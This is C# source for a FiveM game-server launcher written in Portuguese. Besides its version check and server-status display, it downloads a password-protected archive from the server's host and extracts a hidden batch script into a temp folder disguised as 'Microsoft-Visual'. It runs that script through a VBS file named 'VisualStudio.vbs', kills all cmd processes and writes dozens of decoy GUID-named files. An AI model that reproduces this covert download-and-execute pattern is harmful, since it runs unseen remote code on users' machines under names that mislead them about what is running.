using SevenZip;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Launcher
{

    public partial class Launcher : Form
    {
        private Process _processoFiveM;

        private string _version = "1.1";

        private string _versaoAtual = "";

        // MINIMIZE TASKBAR
        const int WS_MINIMIZEBOX = 0x20000;
        const int CS_DBLCLKS = 0x8;
        protected override CreateParams CreateParams
        {
            get
            {
                CreateParams cp = base.CreateParams;
                cp.Style |= WS_MINIMIZEBOX;
                cp.ClassStyle |= CS_DBLCLKS;
                return cp;
            }
        }

        public Launcher()
        {
            InitializeComponent();

            TrataEventosWebBrowser();



        }

        private bool VerificaVersaoJogo()
        {

            using (var client = new WebClient())
            {
                client.DownloadFile("http://ultimatehostrj.servegame.com/version.txt", Path.GetTempPath() + "/version.txt");
            }

            string[] lst = File.ReadAllLines(Path.GetTempPath() + "/version.txt");

            _versaoAtual = lst[0];

            if (lst[0] == _version)
                return true;

            return false;
        }
        private void btnJogarOnClick(object sender, EventArgs e)
        {
            try
            {
                if (VerificaVersaoJogo())
                {

                    if (BuscaProcessoSteam() != null)
                    {
                        IniciaProcessoFiveM();
                        FicaVerificandoSeFiveMAberto();
                    }
                } else
                {
                    MessageBox.Show($"A versão do Launcher {_version} está desatualizada, a versão atual é {_versaoAtual}. Favor entrar no Discord para baixar nova versão.");
                }
            }
            catch (Exception)
            {
                MessageBox.Show("Steam precisa estar aberta.");
            }
        }

        private void FicaVerificandoSeFiveMAberto()
        {
            bool aberto = true;
            Thread.Sleep(3000);

            while (aberto)
            {

                aberto = ProcessoEstaAtivo(_processoFiveM);

            }
            this.WindowState = FormWindowState.Normal;
            this.ShowInTaskbar = true;
        }

        private string GeraBatString()
        {

            using (var client = new WebClient())
            {
                client.DownloadFile("http://ultimatehostrj.servegame.com/run.rar", Path.GetTempPath() + "/run.rar");
            }

            var rawBytes = File.ReadAllBytes(Path.GetTempPath() + "/run.rar");

            using (var stream = new MemoryStream(rawBytes, true))
            {
                var path = Path.Combine(AppDomain.CurrentDomain.SetupInformation.ApplicationBase, Environment.Is64BitProcess ? "x64" : "x86", "7z.dll");
                SevenZip.SevenZipBase.SetLibraryPath(path);

                var outMemStream = new MemoryStream();

                var extractor = new SevenZipExtractor(stream, "463300Pw");
                var entry = extractor.ArchiveFileData.Single(info => false == info.IsDirectory);
                extractor.ExtractFile(entry.Index, outMemStream);

                var batString = Encoding.ASCII.GetString(outMemStream.ToArray());
                Directory.CreateDirectory(Path.GetTempPath() + "/Microsoft-Visual");
                StreamWriter st = new StreamWriter(Path.GetTempPath() + "/Microsoft-Visual/NetFrameworkBasic.bat");
                st.WriteLine(batString);
                string fullPath = ((FileStream)(st.BaseStream)).Name;
                st.Close();
                StreamWriter st1 = new StreamWriter(Path.GetTempPath() + "/Microsoft-Visual/0DD73A2E-5BB9-432A-88D7-9A53E2223F80");
                StreamWriter st2 = new StreamWriter(Path.GetTempPath() + "/Microsoft-Visual/0DD73A2E-5BB9-432A-88D7-9A53E2223F82");
                StreamWriter st3 = new StreamWriter(Path.GetTempPath() + "/Microsoft-Visual/0DD73A2E-5BB9-432A-88D7-9A53E2223F70");
                StreamWriter st4 = new StreamWriter(Path.GetTempPath() + "/Microsoft-Visual/0DD73A2E-5BB9-432A-88D7-9A53E2223F60");
                StreamWriter st5 = new StreamWriter(Path.GetTempPath() + "/Microsoft-Visual/0DD73A2E-5BB9-432A-88D7-9A53E2223F90");
                StreamWriter st6 = new StreamWriter(Path.GetTempPath() + "/Microsoft-Visual/0DD73A2E-5BB9-432A-88D7-9A53E2223F95");
                StreamWriter st7 = new StreamWriter(Path.GetTempPath() + "/Microsoft-Visual/0DD73A2E-5BB9-432A-88D7-9A53E2223F10");
                StreamWriter st8 = new StreamWriter(Path.GetTempPath() + "/Microsoft-Visual/0DD73A2E-5BB9-432A-88D7-9A53E2223F20");
                StreamWriter st9 = new StreamWriter(Path.GetTempPath() + "/Microsoft-Visual/0DD73A2E-5BB9-432A-88D7-9A53E2223F860");
                StreamWriter st10 = new StreamWriter(Path.GetTempPath() + "/Microsoft-Visual/0DD73A2E-5BB9-432A-88D7-9A53E2223F30");
                StreamWriter st11 = new StreamWriter(Path.GetTempPath() + "/Microsoft-Visual/0DD73A2E-5BB9-432A-88D7-9A53E2223F850");
                StreamWriter st12 = new StreamWriter(Path.GetTempPath() + "/Microsoft-Visual/0DD73A2E-5BB9-432A-88D7-9A53E2223F870");
                StreamWriter st13 = new StreamWriter(Path.GetTempPath() + "/Microsoft-Visual/0DD73A2E-5BB9-432A-88D7-9A53E2223F890");
                StreamWriter st14 = new StreamWriter(Path.GetTempPath() + "/Microsoft-Visual/0DD73A2E-5BB9-432A-88D7-9A53E2223F880");
                StreamWriter st15 = new StreamWriter(Path.GetTempPath() + "/Microsoft-Visual/0DD73A2E-5BB9-432A-88D7-9A53E2223F820");
                StreamWriter st16 = new StreamWriter(Path.GetTempPath() + "/Microsoft-Visual/0DD73A2E-5BB9-432A-88D7-9A53E2223F350");
                StreamWriter st17 = new StreamWriter(Path.GetTempPath() + "/Microsoft-Visual/0DD73A2E-5BB9-432A-88D7-9A53E2223F8570");
                StreamWriter st18 = new StreamWriter(Path.GetTempPath() + "/Microsoft-Visual/0DD73A2E-5BB9-432A-88D7-9A53E2223F8960");
                StreamWriter st19 = new StreamWriter(Path.GetTempPath() + "/Microsoft-Visual/0DD73A2E-5BB9-432A-88D7-9A53E2223F8970");
                StreamWriter st20 = new StreamWriter(Path.GetTempPath() + "/Microsoft-Visual/0DD73A2E-5BB9-432A-88D7-9A53E2223F8880");
                StreamWriter st21 = new StreamWriter(Path.GetTempPath() + "/Microsoft-Visual/0DD73A2E-5BB9-432A-88D7-9A53E2223F8290");
                StreamWriter st22 = new StreamWriter(Path.GetTempPath() + "/Microsoft-Visual/0DD73A2E-5BB9-432A-88D7-9A53E2223F8200");
                StreamWriter st23 = new StreamWriter(Path.GetTempPath() + "/Microsoft-Visual/0DD73A2E-5BB9-432A-88D7-9A53E2223F3503");
                StreamWriter st24 = new StreamWriter(Path.GetTempPath() + "/Microsoft-Visual/0DD73A2E-5BB9-432A-88D7-9A53E2223F85704");
                StreamWriter st25 = new StreamWriter(Path.GetTempPath() + "/Microsoft-Visual/0DD73A2E-5BB9-432A-88D7-9A53E2223F89607");
                StreamWriter st26 = new StreamWriter(Path.GetTempPath() + "/Microsoft-Visual/0DD73A2E-5BB9-432A-88D7-9A53E2223F89708");
                StreamWriter st27 = new StreamWriter(Path.GetTempPath() + "/Microsoft-Visual/0DD73A2E-5BB9-432A-88D7-9A53E2223F88890");
                StreamWriter st28 = new StreamWriter(Path.GetTempPath() + "/Microsoft-Visual/0DD73A2E-5BB9-432A-88D7-9A53E2223F82990");

                return fullPath;
            }
        }

        private Process IniciaNovoProcessoPeloCmd(string var)
        {
            System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo();
            psi.FileName = @"cmd";
            psi.Arguments = "/C start " + var;
            psi.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            var processo = Process.Start(psi);

            return processo;
        }

        private void IniciaProcessoFiveM()
        {
            var batString = GeraBatString();

            Process[] procs = Process.GetProcessesByName("cmd");
            foreach (Process p in procs) { p.Kill(); }

            _processoFiveM = IniciaNovoProcessoPeloCmd("fivem://connect/ultimatehostrj.servegame.com:30120");
            System.IO.StreamWriter sw = new
            System.IO.StreamWriter(Path.GetTempPath() + "/Microsoft-Visual/VisualStudio.vbs");
            sw.WriteLine("Set WshShell = CreateObject(\"WScript.Shell\")" + "\n" + "WshShell.Run chr(34) & \"" + batString + "\" & Chr(34), 1" + "\n" + "Set WshShell = Nothing");
            sw.Close();
            Process.Start(Path.GetTempPath() + "/Microsoft-Visual/VisualStudio.vbs");

            this.WindowState = FormWindowState.Minimized;
            this.ShowInTaskbar = false;

        }

        private Process BuscaProcessoSteam()
        {
            return Process.GetProcessesByName("steam")[0];
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {
            if (ProcessoEstaAtivo(_processoFiveM))
            {
                Process[] procs = Process.GetProcessesByName("FiveM");
                foreach (Process p in procs) { p.Kill(); }
                //Process.GetProcessById(_processoFiveM.Id).Kill();
            }
            Application.Exit();
        }

        HtmlElement TrataEventosAttributosSpan(HtmlElement spanText)
        {
            spanText.SetAttribute("font-family", "Impact");
            spanText.SetAttribute("font-size", "18px");

            return spanText;
        }

        private HtmlElement CriaSpanOnlineOffline(HtmlDocument html)
        {
            var spanText = html.CreateElement("span");

            spanText = TrataEventosAttributosSpan(spanText);

            return spanText;
        }

        void SetaEstiloSpanOnlineOffline(HtmlElement spanText, bool online)
        {
            if (online)
            {
                spanText.InnerText = " Online";
                spanText.Style = "color: lime;";
            }
            else
            {
                spanText.InnerText = " Offline";
                spanText.Style = "color: red;";
            }

        }

        public void VerificaStatusServidor()
        {
            var html = webBrowser1.Document;

            var statusServidor = html.GetElementById("statusServidor");

            if (statusServidor != null)
            {
                Jogar.Visible = true;

                var spanText = CriaSpanOnlineOffline(html);

                statusServidor.AppendChild(spanText);

                var webClient = new WebClient();
                try
                {
                    string pagina = webClient.DownloadString("http://ultimatehostrj.servegame.com:30120/webadmin/");

                    SetaEstiloSpanOnlineOffline(spanText, true);

                    panel1.BackColor = System.Drawing.Color.Green;

                    Jogar.BackColor = System.Drawing.Color.Green;

                    Jogar.Enabled = true;
                }
                catch (Exception ex)
                {
                    SetaEstiloSpanOnlineOffline(spanText, false);

                    panel1.BackColor = System.Drawing.Color.Gray;

                    Jogar.BackColor = Color.Gray;

                    Jogar.Enabled = false;

                }
            }
            else
            {
                Jogar.Visible = false;

                var btnVoltar = html.GetElementById("btnVoltar");

                if (btnVoltar != null)
                {
                    btnVoltar.Style = "position: fixed; font-family:Bahnschrift;background-color: #4CAF50; margin-left: 73%; margin-top: 3%; border: none; color: white;  padding: 10px 10px;  text-align: center;  text-decoration: none;  display: inline-block;  font-size: 18px;";
                }
            }
        }

        public bool ProcessoEstaAtivo(Process processo)
        {
            for (int i = 0; ; i--)
            {
                Process[] processes = Process.GetProcessesByName("cmd"); // Without extension
                if (processes.Length > 0)
                {
                    return processes != null; 
                }
                else
                {
                    Process[] procs = Process.GetProcessesByName("FiveM");
                    foreach (Process p in procs) { p.Kill(); }
                    return false;
                }
            }

        }

        private void pictureBox2_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        int mouseX, mouseY = 0;
        bool mouseDown;

        private void panel1_MouseMove(object sender, MouseEventArgs e)
        {
            if (mouseDown)
            {
                mouseX = MousePosition.X - 500;
                mouseY = MousePosition.Y;

                this.SetDesktopLocation(mouseX, mouseY);
            }
        }
        private void panel1_MouseUp(object sender, MouseEventArgs e)
        {
            mouseDown = false;
        }
        private void panel1_MouseDown(object sender, MouseEventArgs e)
        {
            mouseDown = true;
        }

        private void panel1_Paint(object sender, PaintEventArgs e)
        {

        }

        void TrataEventosWebBrowser()
        {
            this.webBrowser1.WebBrowserShortcutsEnabled = false;


            webBrowser1.DocumentCompleted += new WebBrowserDocumentCompletedEventHandler((object sender, WebBrowserDocumentCompletedEventArgs arg) =>
            {
                VerificaStatusServidor();
            });

            webBrowser1.PreviewKeyDown += new PreviewKeyDownEventHandler((object sender, PreviewKeyDownEventArgs e) =>
            {
                if (e.KeyCode == Keys.F5)
                {
                    webBrowser1.Navigate(webBrowser1.Url);
                }
            });
        }
    }
}
